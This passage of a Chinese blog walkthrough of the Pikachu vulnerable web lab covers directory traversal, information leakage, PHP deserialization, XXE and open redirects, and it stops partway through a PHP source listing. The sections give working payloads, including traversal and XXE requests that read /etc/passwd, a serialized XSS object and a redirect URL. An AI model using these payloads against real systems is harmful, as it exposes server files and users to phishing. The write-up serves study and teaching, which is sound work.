看到这里，你可能会觉得目录遍历漏洞和不安全的文件下载甚至文件包含漏洞差不多，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，这些漏洞都是在功能设计中将要操作的文件使用变量的方式传递给了后台而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下</p>
<p>需要区分一下的是，如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况我们称为<a href="/posts/2022-08-28-pikachu/#敏感信息泄露">敏感信息泄露</a>而并不归为目录遍历漏洞</p>
<h3 id="目录遍历">目录遍历</h3>
<p>页面给出两个超链接，点击一下会弹出文本</p>
<p><img alt="img" src="./img/2022090-0-5.png"></p>
<p>看看URL，发现是通过GET请求传入文件路径进行读取</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/dir/dir_list.php?title=jarheads.php
</code></pre><p>我们输入足够的<code>../</code>跳转到根目录，然后读取服务器操作系统的重要文件，比如<code>/etc/passwd</code></p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/dir/dir_list.php?title=../../../../../../../etc/passwd
</code></pre><p><img alt="img" src="./img/2022090-1-4.png"></p>
<h2 id="敏感信息泄露">敏感信息泄露</h2>
<h3 id="概述-10">概述</h3>
<p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到，比如：</p>
<ul>
<li>通过访问url下的目录，可以直接列出目录下的文件列表</li>
<li>输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息</li>
<li>前端的源码（html、css、js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等</li>
</ul>
<p>类似以上这些情况，我们称为敏感信息泄露</p>
<p>敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助，甚至会直接造成严重的损失</p>
<p>因此，在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理</p>
<h3 id="icanseeyourabc">IcanseeyourABC</h3>
<p>这个漏洞不必做过多解说</p>
<p>右键查看前端源码，留有后台开发时方便测试用的注释</p>
<p><img alt="img" src="./img/2022091-0-4.png"></p>
<p>登录后查看cookie，发现账号和密码的哈希值都被直接写进了cookie里</p>
<p><img alt="img" src="./img/2022091-1-4.png"></p>
<p>通过URL可以直接查看目录信息、操作系统版本、Web服务器应用版本、IP地址和端口号</p>
<p><img alt="img" src="./img/2022091-2-3.png"></p>
<p>这些疏忽都或多或少暴露出很多信息，若有黑客攻击，这些信息无疑会成为他们的最大助力</p>
<h2 id="php反序列化">PHP反序列化</h2>
<h3 id="概述-11">概述</h3>
<p>在理解这个漏洞前，你需要先搞清楚php中<code>serialize()</code>、<code>unserialize()</code>这两个函数</p>
<h4 id="序列化serialize">序列化<code>serialize()</code></h4>
<p>序列化说通俗点就是把一个对象变成可以传输的字符串，比如下面是一个对象</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">S</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="o">=</span><span class="s2">&#34;pikachu&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$s</span><span class="o">=</span><span class="k">new</span> <span class="nx">S</span><span class="p">();</span> <span class="c1">//创建一个对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span> <span class="c1">//把这个对象进行序列化
</span></span></span></code></pre></div><p>序列化后得到的结果是这个样子的：</p>
<pre tabindex="0"><code>O:1:&#34;S&#34;:1:{s:4:&#34;test&#34;;s:7:&#34;pikachu&#34;;}
</code></pre><ul>
<li><code>O</code>：代表object</li>
<li><code>1</code>：代表对象名字长度为一个字符</li>
<li><code>S</code>：对象的名称</li>
<li><code>1</code>：代表对象里面有一个变量</li>
<li><code>s</code>：数据类型</li>
<li><code>4</code>：变量名称的长度</li>
<li><code>test</code>：变量名称</li>
<li><code>s</code>：数据类型</li>
<li><code>7</code>：变量值的长度</li>
<li><code>pikachu</code>：变量值</li>
</ul>
<h4 id="反序列化unserialize">反序列化<code>unserialize()</code></h4>
<p>反序列化就是把被序列化的字符串还原为对象，然后在接下来的代码中继续使用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$u</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="s2">&#34;O:1:&#34;</span><span class="nx">S</span><span class="s2">&#34;:1:{s:4:&#34;</span><span class="nx">test</span><span class="s2">&#34;;s:7:&#34;</span><span class="nx">pikachu</span><span class="s2">&#34;;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$u</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span> <span class="c1">//得到的结果为pikachu 
</span></span></span></code></pre></div><p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题</p>
<p>常见的几个魔法函数：</p>
<ul>
<li><code>__construct()</code>：当一个对象创建时被调用</li>
<li><code>__destruct()</code>：当一个对象销毁时被调用</li>
<li><code>__toString()</code>：当一个对象被当作一个字符串使用</li>
<li><code>__sleep()</code>：在对象在被序列化之前运行</li>
<li><code>__wakeup()</code>：将在序列化之后立即被调用</li>
</ul>
<p>漏洞举例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">S</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">&#34;pikachu&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">       <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$unser</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span></code></pre></div><p>payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;S&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;test&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">29</span><span class="o">:</span><span class="s2">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class="p">;}</span>
</span></span></code></pre></div><h3 id="php反序列化漏洞">PHP反序列化漏洞</h3>
<p>页面给了一个可以接受序列化数据的api</p>
<p><img alt="img" src="./img/2022090-14.png"></p>
<p>这还不够劲爆吗</p>
<p>我们先来手搓一个类然后打印出序列化后的字符串</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">s</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">s</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>浏览器打开，查看源代码得到序列化好的payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;s&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;test&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">29</span><span class="o">:</span><span class="s2">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class="p">;}</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022091-10.png"></p>
<p>看看后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;unser.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">S</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">&#34;pikachu&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//O:1:&#34;S&#34;:1:{s:4:&#34;test&#34;;s:29:&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;;}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;o&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;o&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nv">$unser</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;</span><span class="si">{</span><span class="nv">$unser</span><span class="o">-&gt;</span><span class="na">test</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>源码使用了<code>__construct()</code>函数，函数会在类被创建时立即被调用</p>
<p>可以看到程序并没有对传入的类进行校验，而直接输出到前端，这就造成了漏洞</p>
<p>这类反序列化漏洞要根据攻击对象的实际操作来加以利用，比如输出到前端就可以利用XSS、输送到数据库就可以利用SQL注入等等</p>
<h2 id="xxe">XXE</h2>
<h3 id="概述-12">概述</h3>
<p>XXE（xml external entity injection）即“xml外部实体注入漏洞”，简单概括一下就是“攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行导致问题”。也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，最终导致xml外部实体注入</p>
<p>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，也就直接避免了这个漏洞</p>
<p>以PHP为例，在PHP里面解析xml使用的是<a href="https://www.runoob.com/php/php-ref-libxml.html">Libxml</a>，而其在≥2.9.0的版本中默认禁止解析xml外部实体内容</p>
<p>XML简介：</p>
<ul>
<li>XML指可扩展标记语言（eXtensible Markup Language）</li>
<li>XML被设计用来传输和存储数据，不用于表现和展示数据，而HTML 则用来表现数据</li>
</ul>
<p>XML文档格式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!--第一部分：XML声明--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!--第二部分：文档类型定义DTD--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note [  &lt;!--定义此文档是note类型的文档--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;!ENTITY entity-name SYSTEM &#34;URL/URL&#34;&gt;</span>  <span class="c">&lt;!--外部实体声明--&gt;</span>
</span></span><span class="line"><span class="cl">]&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!--第三部分：文档元素--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;note&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;to&gt;</span>Dave<span class="nt">&lt;/to&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;from&gt;</span>Tom<span class="nt">&lt;/from&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;head&gt;</span>Reminder<span class="nt">&lt;/head&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;body&gt;</span>You are a good man<span class="nt">&lt;/body&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/note&gt;</span>
</span></span></code></pre></div><p>文档类型定义（Document Type Definition，DTD），是用来为XML文档定义语法约束的</p>
<ul>
<li>DTD内部声明：<code>&lt;!DOCTYPE 根元素[元素声明]&gt;</code></li>
<li>DTD外部引用：<code>&lt;!DOCTYPE 根元素名称SYSTEM &quot;外部的DTD的URI&quot;&gt;</code></li>
<li>引用公共的DTD：<code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公共DTD的URI&quot;&gt;</code></li>
</ul>
<p>外部实体引用payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE ANY [
</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY f SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>  //将file的内容赋值给f
</span></span><span class="line"><span class="cl">]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;x&gt;</span><span class="ni">&amp;f;</span><span class="nt">&lt;/x&gt;</span>  //读取f可读取的file的值
</span></span></code></pre></div><p>外部引用还可以支持http、file、ftp等协议</p>
<p><code>simplexml_load_string()</code>：</p>
<p>用于接收格式正确的XML文档，并解析成<code>SimpleXMLElement</code>对象</p>
<p>更多关于XML的知识可以参看<a href="https://www.runoob.com/xml/xml-tutorial.html">菜鸟教程</a></p>
<h3 id="xxe漏洞">XXE漏洞</h3>
<p>页面给出一个接收XML数据的api</p>
<p>先输入正常的XML试试</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note [&lt;!ENTITY a &#34;XML&#34;&gt;</span>]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;x&gt;</span><span class="ni">&amp;a;</span><span class="nt">&lt;/x&gt;</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022091-11.png"></p>
<p>构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;x&gt;</span><span class="ni">&amp;f;</span><span class="nt">&lt;/x&gt;</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022090-15.png"></p>
<p>这样敏感数据就被打印出来了</p>
<h2 id="url重定向">URL重定向</h2>
<h3 id="概述-13">概述</h3>
<p>不安全的url跳转问题可能发生在一切执行了URL地址跳转的地方
如果后端采用了前端传进来的（可能是用户传参，或者之前预埋在前端页面的url地址）参数作为了跳转的目的地，而又没有做判断的话就可能发生“跳错对象”的问题</p>
<p>url跳转比较直接的危害是钓鱼，即攻击者使用漏洞方的域名（比如一个比较出名的公司域名往往会让用户放心的点击）做掩盖，而最终跳转的确实钓鱼网站</p>
<h3 id="不安全的url跳转">不安全的URL跳转</h3>
<p>页面有四个a标签，点击第四个弹出一行字</p>
<p><img alt="img" src="./img/2022090-13.png"></p>
<p>看看地址栏URL</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/urlredirect/urlredirect.php?url=i
</code></pre><p>这样的URL传参其实可以将参数改成恶意站点，比如</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/urlredirect/urlredirect.php?url=http://asuka39.top/
</code></pre><p>太罪恶辣</p>
<p>由于URL较长，不知情的用户往往只看到URL前面的片段就直接点击而被跳转到恶意站点</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;urlredirect.php&#34;</span><span class="p">){</span>
